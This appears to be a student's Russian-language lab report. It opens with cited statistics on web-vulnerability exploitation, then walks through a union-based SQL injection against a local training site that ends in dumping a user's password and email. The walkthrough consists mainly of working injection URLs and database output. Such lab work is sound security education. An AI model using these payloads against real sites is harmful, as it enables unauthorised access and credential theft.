# Часть 1
## 1. Источники

1. https://www.verizon.com/business/resources/reports/dbir/

2. https://deepstrike.io/blog/vulnerability-statistics-2025

3. https://www.recordedfuture.com/research/h1-2025-malware-and-vulnerability-trends

4. https://medium.com/@zahirbdby/sql-injection-attacks-cost-companies-8-7m-heres-what-every-developer-must-know-ca614b7296b1

5. https://www.vikingcloud.com/blog/cybersecurity-statistics#:~:text=Device%20and%20Cloud%20Security%20Threats,one%20cloud%20attack%20a%20year.&text=78.,incidents%20result%20in%20data%20breaches.&text=79.,them%20alone%20caused%20by%20misconfigurations.&text=80.,part%20due%20to%20human%20error.&text=81.,are%20still%20vulnerable%20to%20attack.&text=82.,one%20known%20but%20unaddressed%20risk.&text=83.,%25%20year-on-year.&text=84.,are%20growing%20by%2020%25%20annually

## 2. Доля успешных атак через эксплуатацию веб-уязвимостей

Многие сайты выделяют долю эксплуатации уязвимостей в целом (не только веб).
Я постаралась выделить долю веб-атак.

### 2.1 Verizon DBIR 2024

Согласно отчёту:

- ~23% всех подтверждённых атак происходят через эксплуатацию уязвимостей.

DBIR также указывает, что:
- Веб-приложения являются одной из самых атакуемых поверхностей.
- Значительная часть эксплуатаций связана с публично доступными сервисами.

### 2.2 Уточнение по веб-вектору (DeepStrike)

DeepStrike указывает, что:

- ~20% успешных атак инициируются через эксплуатацию уязвимостей.
- Большинство активно эксплуатируемых уязвимостей доступны по сети без аутентификации.
- Основной атакуемый слой — публичные веб-сервисы и интернет-доступные приложения.

Вывод по двум сайтам:

Из 20–23% атак через эксплуатацию уязвимостей, значительная часть относится именно к веб-уязвимостям, поскольку атаки происходят через публично доступные сервисы.

## 3. Распределение по категориям веб-уязвимостей, приводящих к успешным атакам

### 3.1 Recorded Future (H1 2025)

Среди реально эксплуатируемых уязвимостей:

| Категория (включая веб-контекст) | Доля |
|-----------------------------------|------|
| Remote Code Execution (включая web RCE) | ~33% |
| Authentication Bypass (в т.ч. веб) | ~18–22% |
| Improper Authorization / Access Control | ~15–18% |
| Injection (SQL инъекции, Command Injection) | ~10–12% |
| Deserialization (часто в веб-API) | ~5–8% |
| Прочие | ~10% |

### 3.2 Веб-атаки отдельно (SQL инъекции)

- SQL инъекции составляют ~65% веб-атак.

Вывод

1. Около 20–23% успешных атак происходят через эксплуатацию уязвимостей.
2. Значительная часть этих атак связана с веб-сервисами.
3. Среди веб-уязвимостей, приводящих к успешным атакам, доминируют:
   - Remote Code Execution
   - Authentication Bypass
   - Broken Access Control
   - Injection (включая SQL инъекции)


# Часть 2

Перешла на localhost:8080  
Установила базу данных.  
Потом решила ввести id=9: http://localhost:8080/task/?id=09  
Случайным образом узнала, что у Volk2 id=9.  
Подумала, а вдруг у всех такой айди, поэтому посмотрела логин у пользователя с id=8, там оказался Kesha: http://localhost:8080/task/?id=08  
Далее к ссылке добавила кавычку, чтобы посмотреть есть ли уязвимость: http://localhost:8080/task/?id=09'  
Выдало: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
Значит, есть уязвимость

Методом перебора обнаружила, что айди всего 9 штук. 

Далее с помощью order by определяла количество столбцов  
- http://localhost:8080/task/?id=09' order by 1 --+  
- http://localhost:8080/task/?id=09' order by 2 --+  
- http://localhost:8080/task/?id=09' order by 3 --+  
- http://localhost:8080/task/?id=09' order by 4 --+  

На последнем выдало: Unknown column '4' in 'order clause'
Значит, количество столбцов равно трём.  

Изначально я пыталась этот запрос делать без кавычки (http://localhost:8080/task/?id=09 order by 4 --+). Я долго не могла понять, почему никакой ошибки не выдаёт даже на 10000. Наверняка же в БД не столько столбцов. С помощью интернета я поняла, в чём ошибка.

Дальше, чтобы узнать имя базы данных ввела запрос (цифру 3 пишу, чтобы соблюсти синтаксис union)  
http://localhost:8080/task/?id=10' union select 1,database(),3 --+  
В поле айди отобразилось 1, а в поле логина отобразилось название базы данных: security. Так получилось, потому что мы передали несуществующий айди, и вместо столбцов ввели свои данные.

Дальше я захотела узнать список всех таблиц в БД.  
http://localhost:8080/task/?id=10' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+  
Вывело:  
Ваш id:1  
Ваш логин:emails,users  

Далее узнаю названия столбцов в таблице users  
http://localhost:8080/task/?id=10' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+  
Вывело:  
Ваш id:1  
Ваш логин:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password  

Чтобы узнать пароль для Volk2, ввожу такой запрос  
http://localhost:8080/task/?id=10' union select 1,password,3 from users where username='Volk2' --+  
Вывело:  
Ваш id:1  
Ваш логин:Wa spoiuuuuu  

## Значит, пароль для пользователя с логином Volk2 - Wa spoiuuuuu

Аналогично с таблицей emails.  
Узнаю названия столбцов  
http://localhost:8080/task/?id=10' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='emails' --+  
Вывело:  
Ваш id:1  
Ваш логин:id,email_id  

Смотрю, что лежит в email_id для пользователя Vinni-pukh (его id узнала заранее. он равен 4)  
http://localhost:8080/task/?id=10' union select 1,email_id,3 from emails where id=4 --+  
Вывело:  
Ваш id:1  
Ваш логин:honey_lover@otus-lab.com  

## Значит, email пользователя Vinni-pukh - honey_lover@otus-lab.com